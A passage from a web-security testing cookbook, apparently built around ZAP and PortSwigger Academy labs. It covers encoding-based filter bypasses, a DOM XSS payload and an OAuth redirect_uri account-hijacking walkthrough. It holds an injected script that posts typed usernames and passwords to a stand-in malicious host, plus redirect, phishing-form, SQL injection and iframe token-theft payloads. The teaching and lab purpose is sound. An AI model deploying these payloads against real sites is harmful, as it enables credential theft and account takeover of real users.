<p><span class="koboSpan" id="kobo.302.1">Attackers will use </span><a id="_idIndexMarker421"/><span class="koboSpan" id="kobo.303.1">several techniques to help bypass protections. </span><span class="koboSpan" id="kobo.303.2">A common technique </span><a id="_idIndexMarker422"/><span class="koboSpan" id="kobo.304.1">used is </span><em class="italic"><span class="koboSpan" id="kobo.305.1">URL encoding</span></em><span class="koboSpan" id="kobo.306.1"> aka </span><em class="italic"><span class="koboSpan" id="kobo.307.1">percent-encoding</span></em><span class="koboSpan" id="kobo.308.1">, where </span><a id="_idIndexMarker423"/><span class="koboSpan" id="kobo.309.1">certain characters in a URL or form field are replaced with their hexadecimal equivalent preceded by a percent symbol (</span><strong class="source-inline"><span class="koboSpan" id="kobo.310.1">%</span></strong><span class="koboSpan" id="kobo.311.1">). </span><span class="koboSpan" id="kobo.311.2">For example, a very famous hacker character is the single quote (</span><strong class="source-inline"><span class="koboSpan" id="kobo.312.1">'</span></strong><span class="koboSpan" id="kobo.313.1">), which is encoded as </span><strong class="source-inline"><span class="koboSpan" id="kobo.314.1">%27</span></strong><span class="koboSpan" id="kobo.315.1">. </span><span class="koboSpan" id="kobo.315.2">Attackers use this technique to bypass security filters or to inject malicious code into a </span><span class="No-Break"><span class="koboSpan" id="kobo.316.1">web application.</span></span></p>
<p><span class="koboSpan" id="kobo.317.1">When this fails, another technique to bypass </span><a id="_idIndexMarker424"/><span class="koboSpan" id="kobo.318.1">security is known as </span><em class="italic"><span class="koboSpan" id="kobo.319.1">double encoding</span></em><span class="koboSpan" id="kobo.320.1">. </span><span class="koboSpan" id="kobo.320.2">This is when encoded values such as </span><strong class="source-inline"><span class="koboSpan" id="kobo.321.1">%27</span></strong><span class="koboSpan" id="kobo.322.1"> are encoded again to become </span><strong class="source-inline"><span class="koboSpan" id="kobo.323.1">%2527</span></strong><span class="koboSpan" id="kobo.324.1">. </span><span class="koboSpan" id="kobo.324.2">This helps bypass filters that only check for a single </span><span class="No-Break"><span class="koboSpan" id="kobo.325.1">encoded value.</span></span></p>
<p><span class="koboSpan" id="kobo.326.1">The last technique </span><a id="_idIndexMarker425"/><span class="koboSpan" id="kobo.327.1">is called </span><em class="italic"><span class="koboSpan" id="kobo.328.1">Unicode encoding</span></em><span class="koboSpan" id="kobo.329.1">, which allows attackers to bypass blacklist-based input validation filters by using alternative encodings for potentially dangerous characters. </span><span class="koboSpan" id="kobo.329.2">In our same example, </span><strong class="source-inline"><span class="koboSpan" id="kobo.330.1">%27</span></strong><span class="koboSpan" id="kobo.331.1"> becomes </span><strong class="source-inline"><span class="koboSpan" id="kobo.332.1">U+0025U+0027</span></strong><span class="koboSpan" id="kobo.333.1"> or even further written as </span><strong class="source-inline"><span class="koboSpan" id="kobo.334.1">U+0025U+0032U+0037</span></strong><span class="koboSpan" id="kobo.335.1">. </span><span class="koboSpan" id="kobo.335.2">These attacks can also become more complex by representing the single quote in its Unicode-encoded form as a full-width apostrophe (</span><strong class="source-inline"><span class="koboSpan" id="kobo.336.1">U+FF07</span></strong><span class="koboSpan" id="kobo.337.1">) or encoded as </span><strong class="source-inline"><span class="koboSpan" id="kobo.338.1">%EF%BC%87</span></strong><span class="koboSpan" id="kobo.339.1"> in </span><span class="No-Break"><span class="koboSpan" id="kobo.340.1">UTF-8 form.</span></span></p>
<p><span class="koboSpan" id="kobo.341.1">When testing, it’s good to attempt various attacks to understand how the application is being protected and that fields are properly validating input or being parameterized in the case of </span><span class="No-Break"><span class="koboSpan" id="kobo.342.1">SQL statements.</span></span></p>
<h1 id="_idParaDest-263"><a id="_idTextAnchor337"/><span class="koboSpan" id="kobo.343.1">Testing for HTML injection</span></h1>
<p><span class="koboSpan" id="kobo.344.1">HTML injection </span><a id="_idIndexMarker426"/><span class="koboSpan" id="kobo.345.1">is when a user has access to an </span><strong class="source-inline"><span class="koboSpan" id="kobo.346.1">input</span></strong><span class="koboSpan" id="kobo.347.1"> parameter on the web application and can inject arbitrary HTML code into that </span><span class="No-Break"><span class="koboSpan" id="kobo.348.1">web page.</span></span></p>
<h2 id="_idParaDest-264"><a id="_idTextAnchor338"/><span class="koboSpan" id="kobo.349.1">Getting ready</span></h2>
<p><span class="koboSpan" id="kobo.350.1">This lab requires a PortSwigger Academy account and ZAP to intercept requests and responses from the server to </span><span class="No-Break"><span class="koboSpan" id="kobo.351.1">your browser.</span></span></p>
<h2 id="_idParaDest-265"><a id="_idTextAnchor339"/><span class="koboSpan" id="kobo.352.1">How to do it...</span></h2>
<p><span class="koboSpan" id="kobo.353.1">In this recipe, you will utilize the search blog feature, which has a vulnerability to DOM-based XSS. </span><span class="koboSpan" id="kobo.353.2">The attack will make use of an </span><strong class="source-inline"><span class="koboSpan" id="kobo.354.1">innerHTML</span></strong><span class="koboSpan" id="kobo.355.1"> assignment that modifies a </span><strong class="source-inline"><span class="koboSpan" id="kobo.356.1">div</span></strong><span class="koboSpan" id="kobo.357.1"> element’s HTML contents using information from </span><strong class="source-inline"><span class="koboSpan" id="kobo.358.1">location.search</span></strong><span class="koboSpan" id="kobo.359.1">. </span><span class="koboSpan" id="kobo.359.2">The result will be performing a cross-site scripting attack that calls the </span><strong class="source-inline"><span class="koboSpan" id="kobo.360.1">alert</span></strong><span class="koboSpan" id="kobo.361.1"> function to finish </span><span class="No-Break"><span class="koboSpan" id="kobo.362.1">the lab.</span></span></p>
<p><span class="koboSpan" id="kobo.363.1">Perform the following steps to </span><span class="No-Break"><span class="koboSpan" id="kobo.364.1">get started:</span></span></p>
<ol>
<li value="1"><span class="koboSpan" id="kobo.365.1">Navigate to the URL with the browser proxied to ZAP and log into the PortSwigger Academy website to launch the </span><span class="No-Break"><span class="koboSpan" id="kobo.366.1">lab (</span></span><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink"><span class="No-Break"><span class="koboSpan" id="kobo.367.1">https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.368.1">).</span></span></li>
<li><span class="koboSpan" id="kobo.369.1">Within the lab application, type the following HTML payload into the </span><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.370.1">Search</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.371.1"> field:</span></span><pre class="console"><span class="koboSpan" id="kobo.372.1">
&lt;img src=1 onerror=alert(1)&gt;</span></pre></li>
<li><span class="koboSpan" id="kobo.373.1">Once you click </span><strong class="bold"><span class="koboSpan" id="kobo.374.1">Search</span></strong><span class="koboSpan" id="kobo.375.1">, the payload will execute, as shown in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.376.1">Figure 9</span></em></span><em class="italic"><span class="koboSpan" id="kobo.377.1">.8</span></em><span class="koboSpan" id="kobo.378.1">, completing </span><span class="No-Break"><span class="koboSpan" id="kobo.379.1">the lab:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer229">
<span class="koboSpan" id="kobo.380.1"><img alt="Figure 9.8 – The alert payload" src="image/Figure_9.8_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.381.1">Figure 9.8 – The alert payload</span></p>
<p><span class="koboSpan" id="kobo.382.1">Once successful you’ll see the alert payload and the PortSwigger Academy labs should congratulate you. </span><span class="No-Break"><span class="koboSpan" id="kobo.383.1">Well done!</span></span></p>
<h2 id="_idParaDest-266"><a id="_idTextAnchor340"/><span class="koboSpan" id="kobo.384.1">How it works...</span></h2>
<p><span class="koboSpan" id="kobo.385.1">This works </span><a id="_idIndexMarker427"/><span class="koboSpan" id="kobo.386.1">because the </span><strong class="source-inline"><span class="koboSpan" id="kobo.387.1">src</span></strong><span class="koboSpan" id="kobo.388.1"> attribute’s value (</span><strong class="source-inline"><span class="koboSpan" id="kobo.389.1">1</span></strong><span class="koboSpan" id="kobo.390.1">) is incorrect, thus throwing an error. </span><span class="koboSpan" id="kobo.390.2">But because of the error, the </span><strong class="source-inline"><span class="koboSpan" id="kobo.391.1">alert()</span></strong><span class="koboSpan" id="kobo.392.1"> function in the payload is called once the </span><strong class="source-inline"><span class="koboSpan" id="kobo.393.1">onerror</span></strong><span class="koboSpan" id="kobo.394.1"> event handler is activated. </span><span class="koboSpan" id="kobo.394.2">The following result occurs whenever the client attempts to load the web page that contains the malicious post request that executes </span><span class="No-Break"><span class="koboSpan" id="kobo.395.1">the payload.</span></span></p>
<p><span class="koboSpan" id="kobo.396.1">When the output is not properly encoded and user input is not properly sanitized, this opens up the application to injection vulnerabilities, where an attacker is able to craft a malicious HTML page to a target that processes it. </span><span class="koboSpan" id="kobo.396.2">The victim’s browser will then parse and execute the entire crafted page since it will be unable to understand legitimate code, the good parts of the page, from the malicious </span><span class="No-Break"><span class="koboSpan" id="kobo.397.1">HTML code.</span></span></p>
<h2 id="_idParaDest-267"><a id="_idTextAnchor341"/><span class="koboSpan" id="kobo.398.1">There's more...</span></h2>
<p><span class="koboSpan" id="kobo.399.1">HTML injection works similarly to JavaScript execution as they both involve injecting malicious code into a web application and getting the browser to execute the code. </span><span class="koboSpan" id="kobo.399.2">HTML injection is the practice of injecting HTML code into a website, usually via changing input fields or URL parameters. </span><span class="koboSpan" id="kobo.399.3">The browser then renders the injected code, which may alter the website’s structure and design. </span><span class="koboSpan" id="kobo.399.4">Alternatively, JavaScript injection entails inserting JavaScript code. </span><span class="koboSpan" id="kobo.399.5">There are several ways an attacker can perform HTML injection, as </span><span class="No-Break"><span class="koboSpan" id="kobo.400.1">seen here:</span></span></p>
<ul>
<li><strong class="bold"><span class="koboSpan" id="kobo.401.1">Stealing user data</span></strong><span class="koboSpan" id="kobo.402.1">: When a web page loads, an attacker might inject JavaScript </span><a id="_idIndexMarker428"/><span class="koboSpan" id="kobo.403.1">code to steal user information, such as login credentials. </span><span class="koboSpan" id="kobo.403.2">For instance, the attacker may insert code that generates a hidden form on the website and automatically populates it onto a server under their control, allowing them to receive the user’s information. </span><span class="koboSpan" id="kobo.403.3">For example, this could look like the </span><span class="No-Break"><span class="koboSpan" id="kobo.404.1">following code:</span></span><pre class="console"><span class="koboSpan" id="kobo.405.1">
&lt;script&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.406.1">
  function stealData() {</span></pre><pre class="console"><span class="koboSpan" id="kobo.407.1">
    var form = document.createElement("form");</span></pre><pre class="console"><span class="koboSpan" id="kobo.408.1">
    form.setAttribute("method", "post");</span></pre><pre class="console"><span class="koboSpan" id="kobo.409.1">
    form.setAttribute("action", "http://malicious-site.com");</span></pre><pre class="console"><span class="koboSpan" id="kobo.410.1">
    var loginInput = document.createElement("input");</span></pre><pre class="console"><span class="koboSpan" id="kobo.411.1">
    loginInput.setAttribute("type", "hidden");</span></pre><pre class="console"><span class="koboSpan" id="kobo.412.1">
    loginInput.setAttribute("name", "username");</span></pre><pre class="console"><span class="koboSpan" id="kobo.413.1">
    loginInput.setAttribute("value", document.getElementById("username").value);</span></pre><pre class="console"><span class="koboSpan" id="kobo.414.1">
    form.appendChild(loginInput);</span></pre><pre class="console"><span class="koboSpan" id="kobo.415.1">
    var passwordInput = document.createElement("input");</span></pre><pre class="console"><span class="koboSpan" id="kobo.416.1">
    passwordInput.setAttribute("type", "hidden");</span></pre><pre class="console"><span class="koboSpan" id="kobo.417.1">
    passwordInput.setAttribute("name", "password");</span></pre><pre class="console"><span class="koboSpan" id="kobo.418.1">
    passwordInput.setAttribute("value", document.getElementById("password").value);</span></pre><pre class="console"><span class="koboSpan" id="kobo.419.1">
    form.appendChild(passwordInput);</span></pre><pre class="console"><span class="koboSpan" id="kobo.420.1">
    document.body.appendChild(form);</span></pre><pre class="console"><span class="koboSpan" id="kobo.421.1">
    form.submit();</span></pre><pre class="console"><span class="koboSpan" id="kobo.422.1">
  }</span></pre><pre class="console"><span class="koboSpan" id="kobo.423.1">
&lt;/script&gt;</span></pre></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.424.1">Redirecting users</span></strong><span class="koboSpan" id="kobo.425.1">: An attacker could inject JavaScript code into a web page that redirects </span><a id="_idIndexMarker429"/><span class="koboSpan" id="kobo.426.1">users to a malicious website. </span><span class="koboSpan" id="kobo.426.2">For example, the attacker could inject code that changes the value of the </span><strong class="source-inline"><span class="koboSpan" id="kobo.427.1">location</span></strong><span class="koboSpan" id="kobo.428.1"> property in the browser, causing the user to be redirected to a phishing site that mimics a </span><span class="No-Break"><span class="koboSpan" id="kobo.429.1">proper site:</span></span><pre class="console"><span class="koboSpan" id="kobo.430.1">
&lt;script&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.431.1">
  window.location = "http://malicious-site.com";</span></pre><pre class="console"><span class="koboSpan" id="kobo.432.1">
&lt;/script&gt;</span></pre></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.433.1">Phishing</span></strong><span class="koboSpan" id="kobo.434.1">: An attacker </span><a id="_idIndexMarker430"/><span class="koboSpan" id="kobo.435.1">may inject JavaScript code into a web page to direct users to a malicious website. </span><span class="koboSpan" id="kobo.435.2">For instance, the attacker may include code that alters the location field’s value and directs the visitor to a phishing web page that perfectly resembles a </span><span class="No-Break"><span class="koboSpan" id="kobo.436.1">legitimate website:</span></span><pre class="console"><span class="koboSpan" id="kobo.437.1">
&lt;form action="http://malicious-site.com" method="post"&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.438.1">
  &lt;input type="text" name="username" placeholder="Username"&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.439.1">
  &lt;input type="password" name="password" placeholder="Password"&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.440.1">
  &lt;input type="submit" value="Log in"&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.441.1">
&lt;/form&gt;</span></pre></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.442.1">SQL injection</span></strong><span class="koboSpan" id="kobo.443.1">: An attacker </span><a id="_idIndexMarker431"/><span class="koboSpan" id="kobo.444.1">could insert SQL queries into a web application, which could give them unauthorized access to the database and allow them to extract, change, or remove data. </span><span class="koboSpan" id="kobo.444.2">For instance, the attacker </span><a id="_idIndexMarker432"/><span class="koboSpan" id="kobo.445.1">may insert code that returns all the information from the </span><strong class="source-inline"><span class="koboSpan" id="kobo.446.1">users</span></strong><span class="koboSpan" id="kobo.447.1"> table, such as </span><strong class="source-inline"><span class="koboSpan" id="kobo.448.1">UNION SELECT * </span></strong><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.449.1">FROM users"</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.450.1">:</span></span><pre class="console"><span class="koboSpan" id="kobo.451.1">
&lt;form action="http://zaproxy.org/search" method="get"&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.452.1">
  &lt;input type="text" name="search" value="' UNION SELECT * FROM users"&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.453.1">
  &lt;input type="submit" </span><a id="_idTextAnchor342"/><span class="koboSpan" id="kobo.454.1">value="Search"&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.455.1">
&lt;/form&gt;</span></pre></li>
</ul>
<h1 id="_idParaDest-268"><a id="_idTextAnchor343"/><span class="koboSpan" id="kobo.456.1">Testing for client-side URL redirect</span></h1>
<p><span class="koboSpan" id="kobo.457.1">URL redirect attacks (open redirection) occur when applications allow untrusted user input where </span><a id="_idIndexMarker433"/><span class="koboSpan" id="kobo.458.1">an attacker serves a user a hyperlink. </span><span class="koboSpan" id="kobo.458.2">This hyperlink then sends them to an external URL that’s different from the intended web page the user was attempting to access. </span><span class="koboSpan" id="kobo.458.3">In layman’s terms, it’s when an attacker sends a user from the current page to a </span><span class="No-Break"><span class="koboSpan" id="kobo.459.1">new URL.</span></span></p>
<h2 id="_idParaDest-269"><a id="_idTextAnchor344"/><span class="koboSpan" id="kobo.460.1">Getting ready</span></h2>
<p><span class="koboSpan" id="kobo.461.1">This lab requires a PortSwigger Academy account and ZAP to intercept requests and responses from the server to </span><span class="No-Break"><span class="koboSpan" id="kobo.462.1">your browser.</span></span></p>
<h2 id="_idParaDest-270"><a id="_idTextAnchor345"/><span class="koboSpan" id="kobo.463.1">How to do it...</span></h2>
<p><span class="koboSpan" id="kobo.464.1">In this recipe, the </span><a id="_idIndexMarker434"/><span class="koboSpan" id="kobo.465.1">lab uses </span><strong class="bold"><span class="koboSpan" id="kobo.466.1">open authorization</span></strong><span class="koboSpan" id="kobo.467.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.468.1">OAuth</span></strong><span class="koboSpan" id="kobo.469.1">) services to authenticate the fake social media account. </span><span class="koboSpan" id="kobo.469.2">You, the attacker, will exploit a misconfiguration in OAuth to steal authorization tokens linked to another user’s account to gain access and remove a </span><span class="No-Break"><span class="koboSpan" id="kobo.470.1">user, Carlos:</span></span></p>
<ol>
<li value="1"><span class="koboSpan" id="kobo.471.1">Navigate to the URL with the browser proxied to ZAP and log into the PortSwigger Academy website to launch the </span><span class="No-Break"><span class="koboSpan" id="kobo.472.1">lab (</span></span><a href="https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri"><span class="No-Break"><span class="koboSpan" id="kobo.473.1">https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.474.1">).</span></span></li>
<li><span class="koboSpan" id="kobo.475.1">First, ensure you are capturing requests in ZAP. </span><span class="koboSpan" id="kobo.475.2">Then click on </span><strong class="bold"><span class="koboSpan" id="kobo.476.1">My account</span></strong><span class="koboSpan" id="kobo.477.1"> and use the credentials provided to log in via OAuth. </span><span class="koboSpan" id="kobo.477.2">A message on the web page will indicate that you are being redirected. </span><span class="koboSpan" id="kobo.477.3">In addition, in the URL, you will see that you are using OAuth (shown in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.478.1">Figure 9</span></em></span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.479.1">.9</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.480.1">):</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer230">
<span class="koboSpan" id="kobo.481.1"><img alt="Figure 9.9 – The OAuth URL" src="image/Figure_9.9_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.482.1">Figure 9.9 – The OAuth URL</span></p>
<ol>
<li value="3"><span class="koboSpan" id="kobo.483.1">Log out by clicking </span><strong class="bold"><span class="koboSpan" id="kobo.484.1">My Account</span></strong><span class="koboSpan" id="kobo.485.1"> and then log back </span><span class="No-Break"><span class="koboSpan" id="kobo.486.1">in again.</span></span></li>
</ol>
<p><span class="koboSpan" id="kobo.487.1">You’ll notice you are logged in immediately. </span><span class="koboSpan" id="kobo.487.2">This is because there is still an active </span><a id="_idIndexMarker435"/><span class="koboSpan" id="kobo.488.1">session with the OAuth service; therefore, you don’t need to provide a username and password </span><span class="No-Break"><span class="koboSpan" id="kobo.489.1">to re-authenticate.</span></span></p>
<ol>
<li value="4"><span class="koboSpan" id="kobo.490.1">In ZAP, look in the </span><strong class="bold"><span class="koboSpan" id="kobo.491.1">History</span></strong><span class="koboSpan" id="kobo.492.1"> tab, where the most recent OAuth request can be found. </span><span class="koboSpan" id="kobo.492.2">Begin by typing </span><strong class="source-inline"><span class="koboSpan" id="kobo.493.1">GET /auth?client_id=[...]</span></strong><span class="koboSpan" id="kobo.494.1">. </span><span class="koboSpan" id="kobo.494.2">You are immediately redirected to </span><strong class="source-inline"><span class="koboSpan" id="kobo.495.1">redirect_uri</span></strong><span class="koboSpan" id="kobo.496.1"> after this request has been sent together with the authorization code in the request message (see </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.497.1">Figure 9</span></em></span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.498.1">.10</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.499.1">):</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer231">
<span class="koboSpan" id="kobo.500.1"><img alt="Figure 9.10 – Authorization request" src="image/Figure_9.10_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.501.1">Figure 9.10 – Authorization request</span></p>
<ol>
<li value="5"><span class="koboSpan" id="kobo.502.1">Right-click and open this </span><strong class="source-inline"><span class="koboSpan" id="kobo.503.1">/auth?client_id=</span></strong><span class="koboSpan" id="kobo.504.1"> request in </span><strong class="bold"><span class="koboSpan" id="kobo.505.1">Manual </span></strong><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.506.1">Request Editor</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.507.1">.</span></span></li>
<li><span class="koboSpan" id="kobo.508.1">In this request (see </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.509.1">Figure 9</span></em></span><em class="italic"><span class="koboSpan" id="kobo.510.1">.11</span></em><span class="koboSpan" id="kobo.511.1">), you can send any random value as the </span><strong class="source-inline"><span class="koboSpan" id="kobo.512.1">redirect_uri</span></strong><span class="koboSpan" id="kobo.513.1"> without causing errors. </span><span class="koboSpan" id="kobo.513.2">This is the parameter that you’ll use to create the malicious </span><span class="No-Break"><span class="koboSpan" id="kobo.514.1">redirect URL:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer232">
<span class="koboSpan" id="kobo.515.1"><img alt="Figure 9.11 – The redirect_uri manipulation" src="image/Figure_9.11_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.516.1">Figure 9.11 – The redirect_uri manipulation</span></p>
<ol>
<li value="7"><span class="koboSpan" id="kobo.517.1">Next, input </span><a id="_idIndexMarker436"/><span class="koboSpan" id="kobo.518.1">the exploit server </span><strong class="bold"><span class="koboSpan" id="kobo.519.1">Uniform Resource Identifier</span></strong><span class="koboSpan" id="kobo.520.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.521.1">URI</span></strong><span class="koboSpan" id="kobo.522.1">) as </span><strong class="source-inline"><span class="koboSpan" id="kobo.523.1">redirect_uri</span></strong><span class="koboSpan" id="kobo.524.1">. </span><span class="koboSpan" id="kobo.524.2">Then right-click and copy the request URL. </span><span class="koboSpan" id="kobo.524.3">Enter this URL into the browser address bar, and press enter to send the </span><a id="_idIndexMarker437"/><span class="koboSpan" id="kobo.525.1">request. </span><span class="koboSpan" id="kobo.525.2">You’ll see the web page open with the default message that was in the body on the exploit server page; </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.526.1">Hello world!</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.527.1">.</span></span></li>
<li><span class="koboSpan" id="kobo.528.1">Look back inside the exploit server’s access log, and you’ll see that there’s a log entry with your authorization code. </span><span class="koboSpan" id="kobo.528.2">This lets you know that the authorization code is leaking to an external domain (see </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.529.1">Figure 9</span></em></span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.530.1">.12</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.531.1">):</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer233">
<span class="koboSpan" id="kobo.532.1"><img alt="Figure 9.12 – The exploit server access log with the authorization code" src="image/Figure_9.12_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.533.1">Figure 9.12 – The exploit server access log with the authorization code</span></p>
<ol>
<li value="9"><span class="koboSpan" id="kobo.534.1">Now hold on to that same URL but go back to the main exploit server page and paste this into an iframe (see the following code snippet) of the body: </span><strong class="source-inline"><span class="koboSpan" id="kobo.535.1">OAUTH-ID</span></strong><span class="koboSpan" id="kobo.536.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.537.1">CLIENT-ID</span></strong><span class="koboSpan" id="kobo.538.1"> (the OAuth ID from when you first logged in), and </span><strong class="source-inline"><span class="koboSpan" id="kobo.539.1">EXPLOIT-ID</span></strong><span class="koboSpan" id="kobo.540.1"> (the ID of the exploit server) </span><span class="No-Break"><span class="koboSpan" id="kobo.541.1">are correct:</span></span><pre class="console"><span class="koboSpan" id="kobo.542.1">
&lt;iframe src="https://</span><strong class="bold"><span class="koboSpan" id="kobo.543.1">OAUTH-ID.</span></strong><span class="koboSpan" id="kobo.544.1">web-security-academy.net/auth?client_id=</span><strong class="bold"><span class="koboSpan" id="kobo.545.1">CLIENT_ID</span></strong><span class="koboSpan" id="kobo.546.1">&amp;redirect_uri=https://</span><strong class="bold"><span class="koboSpan" id="kobo.547.1">EXPLOIT-ID.</span></strong><span class="koboSpan" id="kobo.548.1">exploit-server.net&amp;response_type=code&amp;scope=openid%20profile%20email"&gt;&lt;/iframe&gt;</span></pre></li>
<li><span class="koboSpan" id="kobo.549.1">Next, click </span><strong class="bold"><span class="koboSpan" id="kobo.550.1">Store</span></strong><span class="koboSpan" id="kobo.551.1"> at the bottom to upload the exploit. </span><span class="koboSpan" id="kobo.551.2">Once this is done, </span><em class="italic"><span class="koboSpan" id="kobo.552.1">do not</span></em><span class="koboSpan" id="kobo.553.1"> click </span><strong class="bold"><span class="koboSpan" id="kobo.554.1">View exploit</span></strong><span class="koboSpan" id="kobo.555.1"> but copy the entire URL from </span><strong class="source-inline"><span class="koboSpan" id="kobo.556.1">src" "</span></strong><span class="koboSpan" id="kobo.557.1">, open a new browser tab, paste the URL into the address bar, and navigate to it. </span><span class="koboSpan" id="kobo.557.2">Again, as before, this will open an </span><a id="_idIndexMarker438"/><span class="koboSpan" id="kobo.558.1">iframe that shows the exploit server web </span><span class="No-Break"><span class="koboSpan" id="kobo.559.1">page inside.</span></span></li>
<li><span class="koboSpan" id="kobo.560.1">Close the browser tab and go back to the exploit server and check the </span><strong class="bold"><span class="koboSpan" id="kobo.561.1">Access log</span></strong><span class="koboSpan" id="kobo.562.1">. </span><span class="koboSpan" id="kobo.562.2">You’ll see the log shows a </span><strong class="source-inline"><span class="koboSpan" id="kobo.563.1">GET /?code=</span></strong><span class="koboSpan" id="kobo.564.1"> request with a newly generated code, as seen in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.565.1">Figure 9</span></em></span><em class="italic"><span class="koboSpan" id="kobo.566.1">.13</span></em><span class="koboSpan" id="kobo.567.1">. </span><span class="koboSpan" id="kobo.567.2">This is your code but it will allow you to understand whether the exploit </span><span class="No-Break"><span class="koboSpan" id="kobo.568.1">is working:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer234">
<span class="koboSpan" id="kobo.569.1"><img alt="Figure 9.13 – The access logs of the iframe payload" src="image/Figure_9.13_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.570.1">Figure 9.13 – The access logs of the iframe payload</span></p>
<ol>
<li value="12"><span class="koboSpan" id="kobo.571.1">Deliver the same exploit to the victim, then go back to the </span><strong class="bold"><span class="koboSpan" id="kobo.572.1">Access Log</span></strong><span class="koboSpan" id="kobo.573.1"> and look for a newly generated code from a different IP address. </span><span class="koboSpan" id="kobo.573.2">Copy the victim’s code from the result in </span><span class="No-Break"><span class="koboSpan" id="kobo.574.1">the log:</span></span></li>
</ol>
<p class="callout-heading"><span class="koboSpan" id="kobo.575.1">Important note</span></p>
<p class="callout"><span class="koboSpan" id="kobo.576.1">If there’s a dash (</span><strong class="source-inline"><span class="koboSpan" id="kobo.577.1">-</span></strong><span class="koboSpan" id="kobo.578.1">) at the end of the code string, be sure to copy this dash along with the </span><span class="No-Break"><span class="koboSpan" id="kobo.579.1">entire code.</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer235">
<span class="koboSpan" id="kobo.580.1"><img alt="Figure 9.14 – The victim payload response" src="image/Figure_9.14_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.581.1">Figure 9.14 – The victim payload response</span></p>
<ol>
<li value="13"><em class="italic"><span class="koboSpan" id="kobo.582.1">Log out</span></em><span class="koboSpan" id="kobo.583.1"> of the entire website first and with the new captured code, craft a new </span><strong class="source-inline"><span class="koboSpan" id="kobo.584.1">oauth-callback</span></strong><span class="koboSpan" id="kobo.585.1"> URL and paste it into the address bar of the browser and navigate </span><span class="No-Break"><span class="koboSpan" id="kobo.586.1">to it:</span></span><pre class="console"><span class="koboSpan" id="kobo.587.1">
https://</span><strong class="bold"><span class="koboSpan" id="kobo.588.1">LAB-ID</span></strong><span class="koboSpan" id="kobo.589.1">.web-security-academy.net/oauth-callback?code=</span><strong class="bold"><span class="koboSpan" id="kobo.590.1">STOLEN-CODE</span></strong></pre></li>
<li><span class="koboSpan" id="kobo.591.1">OAuth will auto-complete authentication and log you in as </span><span class="No-Break"><span class="koboSpan" id="kobo.592.1">the administrator.</span></span></li>
<li><span class="koboSpan" id="kobo.593.1">Go to the </span><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.594.1">Admin</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.595.1"> panel.</span></span></li>
<li><span class="No-Break"><span class="koboSpan" id="kobo.596.1">Delete Carlos.</span></span></li>
</ol>
<h2 id="_idParaDest-271"><a id="_idTextAnchor346"/><span class="koboSpan" id="kobo.597.1">How it works...</span></h2>
